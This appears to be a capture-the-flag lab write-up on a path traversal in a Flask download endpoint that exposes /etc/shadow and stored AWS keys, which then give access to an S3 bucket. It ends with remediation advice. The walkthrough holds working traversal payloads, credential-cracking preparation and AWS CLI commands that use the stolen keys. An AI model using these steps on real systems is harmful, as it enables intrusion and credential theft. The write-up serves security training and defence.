https://pwnedlabs.io/labs/path-traversal-to-aws-credentials-to-s3

---
## Vulnerability Summary
The environment is vulnerable to **Path Traversal** and **Information Disclosure**, 
allowing an attacker to access sensitive local system files and, ultimately, 
exfiltrate cloud-resident data.

1. **Path Traversal**: The application improperly validated the `file` parameter 
   within the `/download` endpoint, enabling attackers to navigate outside the 
   intended directory using `../` sequences.
2. **System File Exposure**: The vulnerability allowed for the retrieval of sensitive 
   OS files, such as `/etc/passwd` and `/etc/shadow`, which could be used for 
   offline credential cracking.
3. **AWS Credential Theft**: By traversing to `~/.aws/credentials` (e.g., 
   `/home/nedf/.aws/credentials`), the attacker successfully exfiltrated static 
   AWS IAM keys stored on the host.
4. **Cloud Compromise**: These credentials granted authenticated access to the 
   `huge-logistics-bucket`, leading to the retrieval of restricted files and the 
   system flag.

---
## Walkthrough
Nmap scan and fuzz directories for the target.

Manual directory traversal outputs the following Flask error:
```bash
"The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again."
```

Inspecting the source code reveals a bucket:
```bash
https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/
```

Fuzz for directories:
```bash
feroxbuster -k -u http://13.50.73.5/ -w /opt/lists/seclists/Discovery/Web-Content/raft-large-directories.txt -C 403,404,400,503,301 -x php,html,htm,asp,aspx,jsp,txt,bak,zip,tar.gz,old,inc,conf,config,log,db,json -t 200
	login
	signup
	download
	profile
```

Register a test account. Then capture the http request to download invoices and try directory traversals (works)
```bash
http://13.50.73.5/download?file=../../../../etc/passwd
http://13.50.73.5/download?file=../../../../etc/shadow
unshadow passwd shadow > unshadowed
```

Use BurpSuite to directory traverse without downloading and find AWS credentials:
```bash
/download?file=../../../../home/nedf/.aws/credentials
```

Using the AWS credentials, enumerate the bucket
```bash
aws configure --profile nedf
curl -I https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com
	eu-north-1
aws sts get-caller-identity --profile nedf
aws s3 ls huge-logistics-bucket --profile nedf
	flag.txt
```

Enuermated the flag. Now download it:
```bash
aws s3 cp s3://huge-logistics-bucket/flag.txt . --profile nedf
```

---
## Remediations
1. **Input Validation & Sanitization**:
   - Never trust user-supplied input for file path generation. Implement strict 
     allow-lists of permitted files or directories.
   - Use built-in functions (e.g., `os.path.basename` in Python) to strip 
     directory traversal characters before processing.

2. **Restrict Access**:
   - Run the application with a low-privileged service account that has no 
     read access to sensitive system directories or user home directories.
   - Utilize a chroot jail or containerization to isolate the application 
     from the underlying host file system.

3. **Cloud-Native Security**:
   - Do not store static AWS credentials on EC2 instances. Always utilize 
     **IAM Instance Profiles** to provide temporary, automatically rotated 
     credentials to applications.
   - If local configuration is mandatory, encrypt files at rest and ensure 
     they are owned by an account with strictly limited read permissions.

4. **Security Hardening**:
   - Disable verbose error messages in production. The disclosed `Flask` 
     error helped confirm the vulnerability's impact.
   - Regularly scan for path traversal patterns during automated security testing 
     (e.g., SAST/DAST) in the development pipeline.
